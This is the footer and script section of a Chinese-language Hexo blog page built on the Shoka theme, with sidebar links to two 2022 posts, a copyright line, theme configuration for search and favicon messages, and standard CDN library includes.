<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/08/26/hello-world/" title="Hello World">Hello World</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/08/26/docker/" title="未命名">未命名</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">qingjiegong @ Blog</span>
  </div>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/08/26/docker/',
    favicon: {
      show: "（●´3｀●）やれやれだぜ",
      hide: "(´Д｀)大変だ！"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
